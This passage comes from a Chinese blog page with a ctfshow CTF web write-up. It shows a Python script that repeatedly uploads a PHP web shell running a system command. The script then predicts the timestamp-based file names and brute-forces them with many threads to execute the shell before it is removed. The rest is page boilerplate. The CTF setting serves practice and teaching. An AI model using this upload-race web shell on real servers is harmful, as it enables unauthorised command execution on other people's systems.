&quot;http://aa167920-a54b-498c-bf8e-877615061128.challenge.ctf.show/&quot;</span><br><span class="line"> </span><br><span class="line">def Thread(fun,*args):</span><br><span class="line">    return threading.Thread(target=fun, args=args)</span><br><span class="line"> </span><br><span class="line">def req(fname):</span><br><span class="line">    r = requests.get(url + &quot;uploads/&quot; + fname + &quot;.php&quot;)</span><br><span class="line">    x = r.text</span><br><span class="line">    if len(x) &gt; 0 and &quot;404 Not Found&quot; not in x and &quot;容器已过期&quot; not in x:</span><br><span class="line">        print(x)</span><br><span class="line"> </span><br><span class="line">def Thread_start(fname):</span><br><span class="line">    for i in range(100,300):</span><br><span class="line">        # 每个文件名单起一个线程</span><br><span class="line">        Thread(req, fname + str(i)).start()</span><br><span class="line"> </span><br><span class="line">def upload():</span><br><span class="line">    while True:</span><br><span class="line">    	# 指定每次上传文件的内容</span><br><span class="line">        file_data = &#123;&#x27;file&#x27;:(&#x27;shell.php&#x27;,&quot;&lt;?php system(\&quot;ls -l ../\&quot;);?&gt;&quot;.encode())&#125;</span><br><span class="line">        r = requests.post(url + &quot;upload.php&quot;,files=file_data)</span><br><span class="line">        txt = r.text</span><br><span class="line">        print(&quot;uploaded:&quot;,txt)</span><br><span class="line">        # 用本次的文件名推算下一次的文件名，相差sleep一次的时间间隔</span><br><span class="line">        ts = int(time.mktime(time.strptime(txt[8:22], &quot;%Y%m%d%H%M%S&quot;)))</span><br><span class="line">        fname = time.strftime(&quot;%Y%m%d%H%M%S&quot;, time.localtime(ts + 3))</span><br><span class="line">        # 单起一个线程，爆破下一次upload的文件名</span><br><span class="line">        Thread(Thread_start, fname).start()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    upload()</span><br></pre></td></tr></table></figure>
+
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/09/19/ctfshow_%E8%90%8C%E6%96%B0/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%A2%98%E8%A7%A3/" rel="tag">题解</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/09/20/ctfshow%E7%BB%83%E4%B9%A0/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            ctfshow练习
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/09/09/%E8%8F%9C%E7%8B%97%E6%9D%AF/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">ctfshow菜狗杯</div>
+      </a>
+    
+  </nav>
+
+  
+   
+  
+   
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2022-2023
+        <i class="ri-heart-fill heart_icon"></i> b1xcy
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/side.svg" alt="b1xcy&#39;s blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i></p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
